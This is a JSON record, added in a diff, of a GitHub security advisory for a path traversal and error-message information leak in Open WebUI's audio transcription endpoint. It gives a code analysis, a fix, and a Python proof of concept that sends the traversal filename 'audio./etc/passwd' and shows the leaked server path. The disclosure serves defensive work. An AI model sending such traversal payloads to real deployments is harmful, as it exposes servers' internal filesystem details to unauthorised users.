@@ -1,0 +1,101 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-28786",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 4.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-209",
+      "CWE-22"
+    ],
+    "description": "### Summary\n\nAn unsanitised filename field in the speech-to-text transcription endpoint allows any authenticated non-admin user to trigger a `FileNotFoundError` whose message - including the server's absolute `DATA_DIR` path - is returned verbatim in the HTTP 400 response body, confirming information disclosure on all default deployments.\n\n### Details\n\n`backend/open_webui/routers/audio.py:1197` extracts a file extension from the raw multipart `filename` using `file.filename.split(\".\")[-1]` with no path sanitisation. The result is concatenated into a filesystem path and passed to `open()`:\n\n```python\next       = file.filename.split(\".\")[-1]       # attacker-controlled, no sanitisation\nfilename  = f\"{id}.{ext}\"                      # may contain \"/\"\nfile_path = f\"{file_dir}/{filename}\"\nwith open(file_path, \"wb\") as f:\n    f.write(contents)\n```\n\nIf the filename is `audio./etc/passwd`, `split(\".\")[-1]` yields `/etc/passwd` and the assembled path becomes:\n\n```\n{CACHE_DIR}/audio/transcriptions/{uuid}./etc/passwd\n```\n\n`open()` fails with `FileNotFoundError`. The outer `except` block at line 1231 returns the exception via `ERROR_MESSAGES.DEFAULT(e)`, leaking the full absolute path in the response body.\n\nThe MIME-type guard at line 1190 checks `Content-Type` (a separate multipart field) and does not constrain `filename`. Setting `Content-Type: audio/wav` satisfies the guard regardless of the filename value.\n\nThis handler is the only file upload path in the codebase that omits `os.path.basename()`. Both sibling handlers apply it explicitly:\n\n```python\n# files.py:244\nfilename = os.path.basename(file.filename)\n\n# pipelines.py:206\nfilename = os.path.basename(file.filename)\n```\n\n**Recommended fix** - match the existing pattern and suppress path leakage in errors:\n\n```python\n# audio.py:1197 - sanitise extension\nfrom pathlib import Path\nsafe_name = Path(file.filename).name\next = Path(safe_name).suffix.lstrip(\".\") or \"bin\"\n\n# audio.py:1231 - suppress internal path in error response\nexcept Exception as e:\n    log.exception(e)\n    raise HTTPException(status_code=400, detail=\"Transcription failed.\")\n```\n\n---\n\n### PoC\n\n**Requirements:** a running Open WebUI instance and one standard (non-admin) user account.\n\n```bash\ndocker run -d -p 3000:8080 --name owui-test ghcr.io/open-webui/open-webui:latest\n# wait ~30 s, register a standard user at http://localhost:3000\npip install requests\n```\n\n```python\nimport requests, sys\n\nBASE_URL = \"http://localhost:3000\"\nEMAIL    = \"user@example.com\"\nPASSWORD = \"changeme\"\n\ntoken = requests.post(f\"{BASE_URL}/api/v1/auths/signin\",\n                      json={\"email\": EMAIL, \"password\": PASSWORD},\n                      timeout=10).json()[\"token\"]\n\nboundary = \"----Boundary\"\nwav_stub = b\"RIFF\\x00\\x00\\x00\\x00WAVE\"\nbody = (\n    f'--{boundary}\\r\\nContent-Disposition: form-data; name=\"file\"; '\n    f'filename=\"audio./etc/passwd\"\\r\\nContent-Type: audio/wav\\r\\n\\r\\n'\n).encode() + wav_stub + f\"\\r\\n--{boundary}--\\r\\n\".encode()\n\nresp = requests.post(\n    f\"{BASE_URL}/api/v1/audio/transcriptions\",\n    data=body,\n    headers={\"Authorization\": f\"Bearer {token}\",\n             \"Content-Type\": f\"multipart/form-data; boundary={boundary}\"},\n    timeout=15,\n)\nprint(resp.status_code, resp.text)\n```\n\n**Observed output (live test, commit `b8112d72b`):**\n\n```\n400 {\"detail\":\"[ERROR: [Errno 2] No such file or directory:\n'/app/backend/data/cache/audio/transcriptions/59457ccf-…./etc/passwd']\"}\n```\n\nThe absolute `DATA_DIR` path is confirmed. Filesystem structure can be enumerated by varying traversal depth and observing which error messages change.\n\n**Note on the write primitive:** the traversal path includes a fresh UUID segment (`{uuid}.`) that never pre-exists as a directory, so `open()` is OS-blocked in all practical scenarios. The impact is information disclosure only.\n\n---\n\n### Impact\nAny authenticated, non-admin user on a default Open WebUI deployment can leak the server's absolute `DATA_DIR` filesystem path. The route is gated by `get_verified_user` - the lowest privilege tier - so every registered account is a potential attacker. Multi-tenant and shared deployments are most exposed.\n\n> **AI Disclosure:** Claude was used to draft this report and the PoC. The vulnerability was identified via manual static analysis of commit `b8112d72b`. All code references were verified by the reporter, who accepts full responsibility for accuracy.",
+    "ghsa_id": "GHSA-vvxm-vxmr-624h",
+    "html_url": "https://github.com/advisories/GHSA-vvxm-vxmr-624h",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-vvxm-vxmr-624h"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-28786"
+      }
+    ],
+    "published_at": "2026-03-27T15:29:32Z",
+    "references": [
+      "https://github.com/open-webui/open-webui/security/advisories/GHSA-vvxm-vxmr-624h",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-28786",
+      "https://github.com/open-webui/open-webui/commit/387225eb8b3906909436004f84fff1b012e067d4",
+      "https://github.com/advisories/GHSA-vvxm-vxmr-624h"
+    ],
+    "severity": "medium",
+    "summary": "Open WebUI vulnerable to Path Traversal in `POST /api/v1/audio/transcriptions`",
+    "updated_at": "2026-03-27T15:29:35Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "0.8.6",
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "vulnerable_version_range": "< 0.8.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-vvxm-vxmr-624h",
+  "repo": {
+    "cve_id": "CVE-2026-28786",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 4.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-209",
+      "CWE-22"
+    ],
+    "description": "### Summary\r\n> **AI Disclosure:** Claude was used to draft this report and the PoC. The vulnerability was identified via manual static analysis of commit `b8112d72b`. All code references were verified by the reporter, who accepts full responsibility for accuracy.\r\n\r\nAn unsanitised filename field in the speech-to-text transcription endpoint allows any authenticated non-admin user to trigger a `FileNotFoundError` whose message - including the server's absolute `DATA_DIR` path - is returned verbatim in the HTTP 400 response body, confirming information disclosure on all default deployments.\r\n\r\n### Details\r\n\r\n`backend/open_webui/routers/audio.py:1197` extracts a file extension from the raw multipart `filename` using `file.filename.split(\".\")[-1]` with no path sanitisation. The result is concatenated into a filesystem path and passed to `open()`:\r\n\r\n```python\r\next       = file.filename.split(\".\")[-1]       # attacker-controlled, no sanitisation\r\nfilename  = f\"{id}.{ext}\"                      # may contain \"/\"\r\nfile_path = f\"{file_dir}/{filename}\"\r\nwith open(file_path, \"wb\") as f:\r\n    f.write(contents)\r\n```\r\n\r\nIf the filename is `audio./etc/passwd`, `split(\".\")[-1]` yields `/etc/passwd` and the assembled path becomes:\r\n\r\n```\r\n{CACHE_DIR}/audio/transcriptions/{uuid}./etc/passwd\r\n```\r\n\r\n`open()` fails with `FileNotFoundError`. The outer `except` block at line 1231 returns the exception via `ERROR_MESSAGES.DEFAULT(e)`, leaking the full absolute path in the response body.\r\n\r\nThe MIME-type guard at line 1190 checks `Content-Type` (a separate multipart field) and does not constrain `filename`. Setting `Content-Type: audio/wav` satisfies the guard regardless of the filename value.\r\n\r\nThis handler is the only file upload path in the codebase that omits `os.path.basename()`. Both sibling handlers apply it explicitly:\r\n\r\n```python\r\n# files.py:244\r\nfilename = os.path.basename(file.filename)\r\n\r\n# pipelines.py:206\r\nfilename = os.path.basename(file.filename)\r\n```\r\n\r\n**Recommended fix** - match the existing pattern and suppress path leakage in errors:\r\n\r\n```python\r\n# audio.py:1197 - sanitise extension\r\nfrom pathlib import Path\r\nsafe_name = Path(file.filename).name\r\next = Path(safe_name).suffix.lstrip(\".\") or \"bin\"\r\n\r\n# audio.py:1231 - suppress internal path in error response\r\nexcept Exception as e:\r\n    log.exception(e)\r\n    raise HTTPException(status_code=400, detail=\"Transcription failed.\")\r\n```\r\n\r\n---\r\n\r\n### PoC\r\n\r\n**Requirements:** a running Open WebUI instance and one standard (non-admin) user account.\r\n\r\n```bash\r\ndocker run -d -p 3000:8080 --name owui-test ghcr.io/open-webui/open-webui:latest\r\n# wait ~30 s, register a standard user at http://localhost:3000\r\npip install requests\r\n```\r\n\r\n```python\r\nimport requests, sys\r\n\r\nBASE_URL = \"http://localhost:3000\"\r\nEMAIL    = \"user@example.com\"\r\nPASSWORD = \"changeme\"\r\n\r\ntoken = requests.post(f\"{BASE_URL}/api/v1/auths/signin\",\r\n                      json={\"email\": EMAIL, \"password\": PASSWORD},\r\n                      timeout=10).json()[\"token\"]\r\n\r\nboundary = \"----Boundary\"\r\nwav_stub = b\"RIFF\\x00\\x00\\x00\\x00WAVE\"\r\nbody = (\r\n    f'--{boundary}\\r\\nContent-Disposition: form-data; name=\"file\"; '\r\n    f'filename=\"audio./etc/passwd\"\\r\\nContent-Type: audio/wav\\r\\n\\r\\n'\r\n).encode() + wav_stub + f\"\\r\\n--{boundary}--\\r\\n\".encode()\r\n\r\nresp = requests.post(\r\n    f\"{BASE_URL}/api/v1/audio/transcriptions\",\r\n    data=body,\r\n    headers={\"Authorization\": f\"Bearer {token}\",\r\n             \"Content-Type\": f\"multipart/form-data; boundary={boundary}\"},\r\n    timeout=15,\r\n)\r\nprint(resp.status_code, resp.text)\r\n```\r\n\r\n**Observed output (live test, commit `b8112d72b`):**\r\n\r\n```\r\n400 {\"detail\":\"[ERROR: [Errno 2] No such file or directory:\r\n'/app/backend/data/cache/audio/transcriptions/59457ccf-…./etc/passwd']\"}\r\n```\r\n\r\nThe absolute `DATA_DIR` path is confirmed. Filesystem structure can be enumerated by varying traversal depth and observing which error messages change.\r\n\r\n**Note on the write primitive:** the traversal path includes a fresh UUID segment (`{uuid}.`) that never pre-exists as a directory, so `open()` is OS-blocked in all practical scenarios. The impact is information disclosure only.\r\n\r\n---\r\n\r\n### Impact\r\n\r\n**CWE-22 - Path Traversal / CWE-209 - Information Exposure Through an Error Message**\r\n**CVSS 3.1:** AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N = **4.3 Medium**\r\n\r\nAny authenticated, non-admin user on a default Open WebUI deployment can leak the server's absolute `DATA_DIR` filesystem path. The route is gated by `get_verified_user` - the lowest privilege tier - so every registered account is a potential attacker. Multi-tenant and shared deployments are most exposed.\r\n",
+    "ghsa_id": "GHSA-vvxm-vxmr-624h",
+    "html_url": "https://github.com/open-webui/open-webui/security/advisories/GHSA-vvxm-vxmr-624h",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-vvxm-vxmr-624h"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-28786"
+      }
+    ],
+    "published_at": "2026-03-26T23:29:07Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Path Traversal (CWE-22) in `POST /api/v1/audio/transcriptions`",
+    "updated_at": "2026-03-26T23:29:07Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "patched_versions": ">=0.8.6",
+        "vulnerable_version_range": "<=0.8.5"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "open-webui/open-webui"
+}
